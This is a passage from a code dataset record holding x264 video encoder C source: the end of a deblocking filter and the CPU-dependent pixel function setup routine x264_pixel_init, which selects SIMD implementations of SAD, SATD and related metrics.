);\n\n    int transform_8x8 = h->mb.b_transform_8x8;\n\n    #define FILTER( dir, edge )\\\n    do\\\n    {\\\n        deblock_edge( h, h->mb.pic.p_fdec[0] + 4*edge*(dir?FDEC_STRIDE:1),\\\n                      FDEC_STRIDE, bs[dir][edge], qp, a, b, 0,\\\n                      h->loopf.deblock_luma[dir] );\\\n        if( CHROMA444 )\\\n        {\\\n            deblock_edge( h, h->mb.pic.p_fdec[1] + 4*edge*(dir?FDEC_STRIDE:1),\\\n                          FDEC_STRIDE, bs[dir][edge], qpc, a, b, 0,\\\n                          h->loopf.deblock_luma[dir] );\\\n            deblock_edge( h, h->mb.pic.p_fdec[2] + 4*edge*(dir?FDEC_STRIDE:1),\\\n                          FDEC_STRIDE, bs[dir][edge], qpc, a, b, 0,\\\n                          h->loopf.deblock_luma[dir] );\\\n        }\\\n    } while(0)\n\n    if( !transform_8x8 ) FILTER( 0, 1 );\n                         FILTER( 0, 2 );\n    if( !transform_8x8 ) FILTER( 0, 3 );\n\n    if( !transform_8x8 ) FILTER( 1, 1 );\n                         FILTER( 1, 2 );\n    if( !transform_8x8 ) FILTER( 1, 3 );\n\n    #undef FILTER\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\deblock.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/****************************************************************************\n * x264_pixel_init:\n ****************************************************************************/\n", "func_signal": "void x264_pixel_init( int cpu, x264_pixel_function_t *pixf )", "code": "{\n    memset( pixf, 0, sizeof(*pixf) );\n\n#define INIT2_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_16x16] = x264_pixel_##name2##_16x16##cpu;\\\n    pixf->name1[PIXEL_16x8]  = x264_pixel_##name2##_16x8##cpu;\n#define INIT4_NAME( name1, name2, cpu ) \\\n    INIT2_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_8x16]  = x264_pixel_##name2##_8x16##cpu;\\\n    pixf->name1[PIXEL_8x8]   = x264_pixel_##name2##_8x8##cpu;\n#define INIT5_NAME( name1, name2, cpu ) \\\n    INIT4_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_8x4]   = x264_pixel_##name2##_8x4##cpu;\n#define INIT6_NAME( name1, name2, cpu ) \\\n    INIT5_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_4x8]   = x264_pixel_##name2##_4x8##cpu;\n#define INIT7_NAME( name1, name2, cpu ) \\\n    INIT6_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_4x4]   = x264_pixel_##name2##_4x4##cpu;\n#define INIT8_NAME( name1, name2, cpu ) \\\n    INIT7_NAME( name1, name2, cpu ) \\\n    pixf->name1[PIXEL_4x16]  = x264_pixel_##name2##_4x16##cpu;\n#define INIT2( name, cpu ) INIT2_NAME( name, name, cpu )\n#define INIT4( name, cpu ) INIT4_NAME( name, name, cpu )\n#define INIT5( name, cpu ) INIT5_NAME( name, name, cpu )\n#define INIT6( name, cpu ) INIT6_NAME( name, name, cpu )\n#define INIT7( name, cpu ) INIT7_NAME( name, name, cpu )\n#define INIT8( name, cpu ) INIT8_NAME( name, name, cpu )\n\n#define INIT_ADS( cpu ) \\\n    pixf->ads[PIXEL_16x16] = x264_pixel_ads4##cpu;\\\n    pixf->ads[PIXEL_16x8] = x264_pixel_ads2##cpu;\\\n    pixf->ads[PIXEL_8x8] = x264_pixel_ads1##cpu;\n\n    INIT8( sad, );\n    INIT8_NAME( sad_aligned, sad, );\n    INIT7( sad_x3, );\n    INIT7( sad_x4, );\n    INIT8( ssd, );\n    INIT8( satd, );\n    INIT7( satd_x3, );\n    INIT7( satd_x4, );\n    INIT4( hadamard_ac, );\n    INIT_ADS( );\n\n    pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16;\n    pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8;\n    pixf->var[PIXEL_16x16] = x264_pixel_var_16x16;\n    pixf->var[PIXEL_8x16]  = x264_pixel_var_8x16;\n    pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8;\n    pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16;\n    pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8;\n\n    pixf->ssd_nv12_core = pixel_ssd_nv12_core;\n    pixf->ssim_4x4x2_core = ssim_4x4x2_core;\n    pixf->ssim_end4 = ssim_end4;\n    pixf->vsad = pixel_vsad;\n    pixf->asd8 = pixel_asd8;\n\n    pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4;\n    pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4;\n    pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8;\n    pixf->intra_sa8d_x3_8x8   = x264_intra_sa8d_x3_8x8;\n    pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c;\n    pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c;\n    pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c;\n    pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c;\n    pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16;\n    pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16;\n\n#if HIGH_BIT_DEPTH\n#if HAVE_MMX\n    if( cpu&X264_CPU_MMX2 )\n    {\n        INIT7( sad, _mmx2 );\n        INIT7_NAME( sad_aligned, sad, _mmx2 );\n        INIT7( sad_x3, _mmx2 );\n        INIT7( sad_x4, _mmx2 );\n        INIT8( satd, _mmx2 );\n        INIT7( satd_x3, _mmx2 );\n        INIT7( satd_x4, _mmx2 );\n        INIT4( hadamard_ac, _mmx2 );\n        INIT8( ssd, _mmx2 );\n        INIT_ADS( _mmx2 );\n\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_mmx2;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_mmx2;\n#if ARCH_X86\n        pixf->var2[PIXEL_8x8]  = x264_pixel_var2_8x8_mmx2;\n        pixf->var2[PIXEL_8x16] = x264_pixel_var2_8x16_mmx2;\n#endif\n\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_mmx2;\n        pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4_mmx2;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_mmx2;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_mmx2;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_mmx2;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_mmx2;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_mmx2;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_mmx2;\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_mmx2;\n    }\n    if( cpu&X264_CPU_SSE2 )\n    {\n        INIT4_NAME( sad_aligned, sad, _sse2_aligned );\n        INIT5( ssd, _sse2 );\n        INIT6( satd, _sse2 );\n        pixf->satd[PIXEL_4x16] = x264_pixel_satd_4x16_sse2;\n\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16_sse2;\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8_sse2;\n#if ARCH_X86_64\n        pixf->intra_sa8d_x3_8x8 = x264_intra_sa8d_x3_8x8_sse2;\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_sse2;\n#endif\n        pixf->intra_sad_x3_4x4  = x264_intra_sad_x3_4x4_sse2;\n        pixf->ssd_nv12_core = x264_pixel_ssd_nv12_core_sse2;\n        pixf->ssim_4x4x2_core  = x264_pixel_ssim_4x4x2_core_sse2;\n        pixf->ssim_end4        = x264_pixel_ssim_end4_sse2;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_sse2;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_sse2;\n        pixf->var2[PIXEL_8x8]  = x264_pixel_var2_8x8_sse2;\n        pixf->var2[PIXEL_8x16] = x264_pixel_var2_8x16_sse2;\n        pixf->intra_sad_x3_8x8 = x264_intra_sad_x3_8x8_sse2;\n    }\n    if( (cpu&X264_CPU_SSE2) && !(cpu&X264_CPU_SSE2_IS_SLOW) )\n    {\n        INIT5( sad, _sse2 );\n        INIT2( sad_x3, _sse2 );\n        INIT2( sad_x4, _sse2 );\n        INIT_ADS( _sse2 );\n\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            INIT4( hadamard_ac, _sse2 );\n        }\n        pixf->vsad = x264_pixel_vsad_sse2;\n        pixf->asd8 = x264_pixel_asd8_sse2;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_sse2;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_sse2;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_sse2;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_sse2;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_sse2;\n    }\n    if( cpu&X264_CPU_SSE2_IS_FAST )\n    {\n        pixf->sad[PIXEL_8x16] = x264_pixel_sad_8x16_sse2;\n        pixf->sad_x3[PIXEL_8x16] = x264_pixel_sad_x3_8x16_sse2;\n        pixf->sad_x3[PIXEL_8x8]  = x264_pixel_sad_x3_8x8_sse2;\n        pixf->sad_x3[PIXEL_8x4]  = x264_pixel_sad_x3_8x4_sse2;\n        pixf->sad_x4[PIXEL_8x16] = x264_pixel_sad_x4_8x16_sse2;\n        pixf->sad_x4[PIXEL_8x8]  = x264_pixel_sad_x4_8x8_sse2;\n        pixf->sad_x4[PIXEL_8x4]  = x264_pixel_sad_x4_8x4_sse2;\n    }\n    if( cpu&X264_CPU_SSSE3 )\n    {\n        INIT4_NAME( sad_aligned, sad, _ssse3_aligned );\n        pixf->sad_aligned[PIXEL_4x4] = x264_pixel_sad_4x4_ssse3;\n        pixf->sad_aligned[PIXEL_4x8] = x264_pixel_sad_4x8_ssse3;\n        INIT7( sad, _ssse3 );\n        INIT7( sad_x3, _ssse3 );\n        INIT7( sad_x4, _ssse3 );\n        INIT_ADS( _ssse3 );\n        INIT6( satd, _ssse3 );\n        pixf->satd[PIXEL_4x16] = x264_pixel_satd_4x16_ssse3;\n\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            INIT4( hadamard_ac, _ssse3 );\n        }\n        pixf->vsad = x264_pixel_vsad_ssse3;\n        pixf->asd8 = x264_pixel_asd8_ssse3;\n        pixf->intra_sad_x3_4x4  = x264_intra_sad_x3_4x4_ssse3;\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_ssse3;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_ssse3;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_ssse3;\n#endif\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_ssse3;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_ssse3;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_ssse3;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_ssse3;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_ssse3;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_ssse3;\n    }\n    if( cpu&X264_CPU_SSE4 )\n    {\n        INIT6( satd, _sse4 );\n        pixf->satd[PIXEL_4x16] = x264_pixel_satd_4x16_sse4;\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            INIT4( hadamard_ac, _sse4 );\n        }\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_sse4;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_sse4;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_sse4;\n#endif\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_sse4;\n    }\n    if( cpu&X264_CPU_AVX )\n    {\n        INIT5_NAME( sad_aligned, sad, _ssse3 ); /* AVX-capable CPUs doesn't benefit from an aligned version */\n        INIT_ADS( _avx );\n        INIT6( satd, _avx );\n        pixf->satd[PIXEL_4x16] = x264_pixel_satd_4x16_avx;\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            INIT4( hadamard_ac, _avx );\n        }\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_avx;\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_avx;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_avx;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_avx;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_avx;\n        pixf->ssd_nv12_core    = x264_pixel_ssd_nv12_core_avx;\n        pixf->ssim_4x4x2_core  = x264_pixel_ssim_4x4x2_core_avx;\n        pixf->ssim_end4        = x264_pixel_ssim_end4_avx;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_avx;\n#endif\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_avx;\n    }\n    if( cpu&X264_CPU_XOP )\n    {\n        INIT5( sad_x3, _xop );\n        INIT5( sad_x4, _xop );\n        pixf->ssd_nv12_core    = x264_pixel_ssd_nv12_core_xop;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_xop;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_xop;\n        pixf->vsad = x264_pixel_vsad_xop;\n        pixf->asd8 = x264_pixel_asd8_xop;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_xop;\n#endif\n    }\n    if( cpu&X264_CPU_AVX2 )\n    {\n        INIT2( ssd, _avx2 );\n        INIT2( sad, _avx2 );\n        INIT2_NAME( sad_aligned, sad, _avx2 );\n        INIT2( sad_x3, _avx2 );\n        INIT2( sad_x4, _avx2 );\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_avx2;\n        pixf->vsad = x264_pixel_vsad_avx2;\n        pixf->ssd_nv12_core = x264_pixel_ssd_nv12_core_avx2;\n        pixf->intra_sad_x3_8x8 = x264_intra_sad_x3_8x8_avx2;\n    }\n#endif // HAVE_MMX\n#else // !HIGH_BIT_DEPTH\n#if HAVE_MMX\n    if( cpu&X264_CPU_MMX )\n    {\n        INIT8( ssd, _mmx );\n    }\n\n    if( cpu&X264_CPU_MMX2 )\n    {\n        INIT8( sad, _mmx2 );\n        INIT8_NAME( sad_aligned, sad, _mmx2 );\n        INIT7( sad_x3, _mmx2 );\n        INIT7( sad_x4, _mmx2 );\n        INIT8( satd, _mmx2 );\n        INIT7( satd_x3, _mmx2 );\n        INIT7( satd_x4, _mmx2 );\n        INIT4( hadamard_ac, _mmx2 );\n        INIT_ADS( _mmx2 );\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_mmx2;\n        pixf->var[PIXEL_8x16]  = x264_pixel_var_8x16_mmx2;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_mmx2;\n#if ARCH_X86\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16_mmx2;\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8_mmx2;\n        pixf->intra_sa8d_x3_8x8 = x264_intra_sa8d_x3_8x8_mmx2;\n        pixf->ssim_4x4x2_core = x264_pixel_ssim_4x4x2_core_mmx2;\n        pixf->var2[PIXEL_8x8] = x264_pixel_var2_8x8_mmx2;\n        pixf->var2[PIXEL_8x16] = x264_pixel_var2_8x16_mmx2;\n        pixf->vsad = x264_pixel_vsad_mmx2;\n\n        if( cpu&X264_CPU_CACHELINE_32 )\n        {\n            INIT5( sad, _cache32_mmx2 );\n            INIT4( sad_x3, _cache32_mmx2 );\n            INIT4( sad_x4, _cache32_mmx2 );\n        }\n        else if( cpu&X264_CPU_CACHELINE_64 && !(cpu&X264_CPU_SLOW_ATOM) )\n        {\n            INIT5( sad, _cache64_mmx2 );\n            INIT4( sad_x3, _cache64_mmx2 );\n            INIT4( sad_x4, _cache64_mmx2 );\n        }\n#else\n        if( cpu&X264_CPU_CACHELINE_64 && !(cpu&X264_CPU_SLOW_ATOM) )\n        {\n            pixf->sad[PIXEL_8x16] = x264_pixel_sad_8x16_cache64_mmx2;\n            pixf->sad[PIXEL_8x8]  = x264_pixel_sad_8x8_cache64_mmx2;\n            pixf->sad[PIXEL_8x4]  = x264_pixel_sad_8x4_cache64_mmx2;\n            pixf->sad_x3[PIXEL_8x16] = x264_pixel_sad_x3_8x16_cache64_mmx2;\n            pixf->sad_x3[PIXEL_8x8]  = x264_pixel_sad_x3_8x8_cache64_mmx2;\n            pixf->sad_x4[PIXEL_8x16] = x264_pixel_sad_x4_8x16_cache64_mmx2;\n            pixf->sad_x4[PIXEL_8x8]  = x264_pixel_sad_x4_8x8_cache64_mmx2;\n        }\n#endif\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_mmx2;\n        pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_mmx2;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_mmx2;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_mmx2;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_mmx2;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_mmx2;\n        pixf->intra_sad_x3_8x8    = x264_intra_sad_x3_8x8_mmx2;\n        pixf->intra_satd_x3_4x4   = x264_intra_satd_x3_4x4_mmx2;\n        pixf->intra_sad_x3_4x4    = x264_intra_sad_x3_4x4_mmx2;\n    }\n\n    if( cpu&X264_CPU_SSE2 )\n    {\n        INIT5( ssd, _sse2slow );\n        INIT2_NAME( sad_aligned, sad, _sse2_aligned );\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_sse2;\n        pixf->ssd_nv12_core    = x264_pixel_ssd_nv12_core_sse2;\n        pixf->ssim_4x4x2_core  = x264_pixel_ssim_4x4x2_core_sse2;\n        pixf->ssim_end4        = x264_pixel_ssim_end4_sse2;\n        pixf->sa8d[PIXEL_16x16] = x264_pixel_sa8d_16x16_sse2;\n        pixf->sa8d[PIXEL_8x8]   = x264_pixel_sa8d_8x8_sse2;\n#if ARCH_X86_64\n        pixf->intra_sa8d_x3_8x8 = x264_intra_sa8d_x3_8x8_sse2;\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_sse2;\n#endif\n        pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8_sse2;\n        pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16_sse2;\n        pixf->vsad = x264_pixel_vsad_sse2;\n        pixf->asd8 = x264_pixel_asd8_sse2;\n    }\n\n    if( (cpu&X264_CPU_SSE2) && !(cpu&X264_CPU_SSE2_IS_SLOW) )\n    {\n        INIT2( sad, _sse2 );\n        INIT2( sad_x3, _sse2 );\n        INIT2( sad_x4, _sse2 );\n        INIT6( satd, _sse2 );\n        pixf->satd[PIXEL_4x16]   = x264_pixel_satd_4x16_sse2;\n        INIT6( satd_x3, _sse2 );\n        INIT6( satd_x4, _sse2 );\n        INIT4( hadamard_ac, _sse2 );\n        INIT_ADS( _sse2 );\n        pixf->var[PIXEL_8x8] = x264_pixel_var_8x8_sse2;\n        pixf->var[PIXEL_8x16] = x264_pixel_var_8x16_sse2;\n        pixf->intra_sad_x3_16x16 = x264_intra_sad_x3_16x16_sse2;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_sse2;\n        pixf->intra_sad_x3_8x16c  = x264_intra_sad_x3_8x16c_sse2;\n        if( cpu&X264_CPU_CACHELINE_64 )\n        {\n            INIT2( ssd, _sse2); /* faster for width 16 on p4 */\n#if ARCH_X86\n            INIT2( sad, _cache64_sse2 );\n            INIT2( sad_x3, _cache64_sse2 );\n            INIT2( sad_x4, _cache64_sse2 );\n#endif\n           if( cpu&X264_CPU_SSE2_IS_FAST )\n           {\n               pixf->sad_x3[PIXEL_8x16] = x264_pixel_sad_x3_8x16_cache64_sse2;\n               pixf->sad_x4[PIXEL_8x16] = x264_pixel_sad_x4_8x16_cache64_sse2;\n           }\n        }\n    }\n\n    if( cpu&X264_CPU_SSE2_IS_FAST && !(cpu&X264_CPU_CACHELINE_64) )\n    {\n        pixf->sad_aligned[PIXEL_8x16] = x264_pixel_sad_8x16_sse2;\n        pixf->sad[PIXEL_8x16] = x264_pixel_sad_8x16_sse2;\n        pixf->sad_x3[PIXEL_8x16] = x264_pixel_sad_x3_8x16_sse2;\n        pixf->sad_x3[PIXEL_8x8] = x264_pixel_sad_x3_8x8_sse2;\n        pixf->sad_x3[PIXEL_8x4] = x264_pixel_sad_x3_8x4_sse2;\n        pixf->sad_x4[PIXEL_8x16] = x264_pixel_sad_x4_8x16_sse2;\n        pixf->sad_x4[PIXEL_8x8] = x264_pixel_sad_x4_8x8_sse2;\n        pixf->sad_x4[PIXEL_8x4] = x264_pixel_sad_x4_8x4_sse2;\n    }\n\n    if( (cpu&X264_CPU_SSE3) && (cpu&X264_CPU_CACHELINE_64) )\n    {\n        INIT2( sad, _sse3 );\n        INIT2( sad_x3, _sse3 );\n        INIT2( sad_x4, _sse3 );\n    }\n\n    if( cpu&X264_CPU_SSSE3 )\n    {\n        INIT4( hadamard_ac, _ssse3 );\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            pixf->intra_sad_x9_4x4  = x264_intra_sad_x9_4x4_ssse3;\n            pixf->intra_satd_x9_4x4 = x264_intra_satd_x9_4x4_ssse3;\n            pixf->intra_sad_x9_8x8  = x264_intra_sad_x9_8x8_ssse3;\n#if ARCH_X86_64\n            pixf->intra_sa8d_x9_8x8 = x264_intra_sa8d_x9_8x8_ssse3;\n#endif\n        }\n        INIT_ADS( _ssse3 );\n        if( cpu&X264_CPU_SLOW_ATOM )\n        {\n            pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_ssse3_atom;\n            pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_ssse3_atom;\n            INIT6( satd, _ssse3_atom );\n            pixf->satd[PIXEL_4x16]  = x264_pixel_satd_4x16_ssse3_atom;\n            INIT6( satd_x3, _ssse3_atom );\n            INIT6( satd_x4, _ssse3_atom );\n            INIT4( hadamard_ac, _ssse3_atom );\n#if ARCH_X86_64\n            pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_ssse3_atom;\n#endif\n        }\n        else\n        {\n            INIT8( ssd, _ssse3 );\n            pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_ssse3;\n            pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_ssse3;\n            INIT8( satd, _ssse3 );\n            INIT7( satd_x3, _ssse3 );\n            INIT7( satd_x4, _ssse3 );\n#if ARCH_X86_64\n            pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_ssse3;\n#endif\n        }\n        pixf->intra_satd_x3_16x16 = x264_intra_satd_x3_16x16_ssse3;\n        if( !(cpu&X264_CPU_SLOW_PSHUFB) )\n            pixf->intra_sad_x3_16x16  = x264_intra_sad_x3_16x16_ssse3;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_ssse3;\n        pixf->intra_satd_x3_8x8c  = x264_intra_satd_x3_8x8c_ssse3;\n        pixf->intra_sad_x3_8x8c   = x264_intra_sad_x3_8x8c_ssse3;\n        pixf->var2[PIXEL_8x8] = x264_pixel_var2_8x8_ssse3;\n        pixf->var2[PIXEL_8x16] = x264_pixel_var2_8x16_ssse3;\n        pixf->asd8 = x264_pixel_asd8_ssse3;\n        if( cpu&X264_CPU_CACHELINE_64 )\n        {\n            INIT2( sad, _cache64_ssse3 );\n            INIT2( sad_x3, _cache64_ssse3 );\n            INIT2( sad_x4, _cache64_ssse3 );\n        }\n        else\n        {\n            INIT2( sad_x3, _ssse3 );\n            INIT5( sad_x4, _ssse3 );\n        }\n        if( (cpu&X264_CPU_SLOW_ATOM) || (cpu&X264_CPU_SLOW_SHUFFLE) )\n        {\n            INIT5( ssd, _sse2 ); /* on conroe, sse2 is faster for width8/16 */\n        }\n    }\n\n    if( cpu&X264_CPU_SSE4 )\n    {\n        INIT8( satd, _sse4 );\n        INIT7( satd_x3, _sse4 );\n        INIT7( satd_x4, _sse4 );\n        INIT4( hadamard_ac, _sse4 );\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            pixf->intra_sad_x9_4x4  = x264_intra_sad_x9_4x4_sse4;\n            pixf->intra_satd_x9_4x4 = x264_intra_satd_x9_4x4_sse4;\n            pixf->intra_sad_x9_8x8  = x264_intra_sad_x9_8x8_sse4;\n#if ARCH_X86_64\n            pixf->intra_sa8d_x9_8x8 = x264_intra_sa8d_x9_8x8_sse4;\n#endif\n        }\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_sse4;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_sse4;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_sse4;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_sse4;\n#endif\n    }\n\n    if( cpu&X264_CPU_AVX )\n    {\n        INIT2_NAME( sad_aligned, sad, _sse2 ); /* AVX-capable CPUs doesn't benefit from an aligned version */\n        INIT2( sad_x3, _avx );\n        INIT2( sad_x4, _avx );\n        INIT8( satd, _avx );\n        INIT7( satd_x3, _avx );\n        INIT7( satd_x4, _avx );\n        INIT_ADS( _avx );\n        INIT4( hadamard_ac, _avx );\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            pixf->intra_sad_x9_4x4  = x264_intra_sad_x9_4x4_avx;\n            pixf->intra_satd_x9_4x4 = x264_intra_satd_x9_4x4_avx;\n            pixf->intra_sad_x9_8x8  = x264_intra_sad_x9_8x8_avx;\n#if ARCH_X86_64\n            pixf->intra_sa8d_x9_8x8 = x264_intra_sa8d_x9_8x8_avx;\n#endif\n        }\n        INIT5( ssd, _avx );\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_avx;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_avx;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_avx;\n        pixf->ssd_nv12_core    = x264_pixel_ssd_nv12_core_avx;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_avx;\n        pixf->var[PIXEL_8x16]  = x264_pixel_var_8x16_avx;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_avx;\n        pixf->ssim_4x4x2_core  = x264_pixel_ssim_4x4x2_core_avx;\n        pixf->ssim_end4        = x264_pixel_ssim_end4_avx;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_avx;\n#endif\n    }\n\n    if( cpu&X264_CPU_XOP )\n    {\n        INIT7( satd, _xop );\n        INIT7( satd_x3, _xop );\n        INIT7( satd_x4, _xop );\n        INIT4( hadamard_ac, _xop );\n        if( !(cpu&X264_CPU_STACK_MOD4) )\n        {\n            pixf->intra_satd_x9_4x4 = x264_intra_satd_x9_4x4_xop;\n        }\n        INIT5( ssd, _xop );\n        pixf->sa8d[PIXEL_16x16]= x264_pixel_sa8d_16x16_xop;\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_xop;\n        pixf->intra_satd_x3_8x16c = x264_intra_satd_x3_8x16c_xop;\n        pixf->ssd_nv12_core    = x264_pixel_ssd_nv12_core_xop;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_xop;\n        pixf->var[PIXEL_8x16]  = x264_pixel_var_8x16_xop;\n        pixf->var[PIXEL_8x8]   = x264_pixel_var_8x8_xop;\n        pixf->var2[PIXEL_8x8] = x264_pixel_var2_8x8_xop;\n        pixf->var2[PIXEL_8x16] = x264_pixel_var2_8x16_xop;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_xop;\n#endif\n    }\n\n    if( cpu&X264_CPU_AVX2 )\n    {\n        INIT2( ssd, _avx2 );\n        INIT2( sad_x3, _avx2 );\n        INIT2( sad_x4, _avx2 );\n        INIT4( satd, _avx2 );\n        INIT2( hadamard_ac, _avx2 );\n        INIT_ADS( _avx2 );\n        pixf->sa8d[PIXEL_8x8]  = x264_pixel_sa8d_8x8_avx2;\n        pixf->var[PIXEL_16x16] = x264_pixel_var_16x16_avx2;\n        pixf->var2[PIXEL_8x16]  = x264_pixel_var2_8x16_avx2;\n        pixf->var2[PIXEL_8x8]   = x264_pixel_var2_8x8_avx2;\n        pixf->intra_sad_x3_16x16 = x264_intra_sad_x3_16x16_avx2;\n        pixf->intra_sad_x9_8x8  = x264_intra_sad_x9_8x8_avx2;\n        pixf->intra_sad_x3_8x8c = x264_intra_sad_x3_8x8c_avx2;\n        pixf->ssd_nv12_core = x264_pixel_ssd_nv12_core_avx2;\n#if ARCH_X86_64\n        pixf->sa8d_satd[PIXEL_16x16] = x264_pixel_sa8d_satd_16x16_avx2;\n#endif\n    }\n#endif //HAVE_MMX\n\n#if 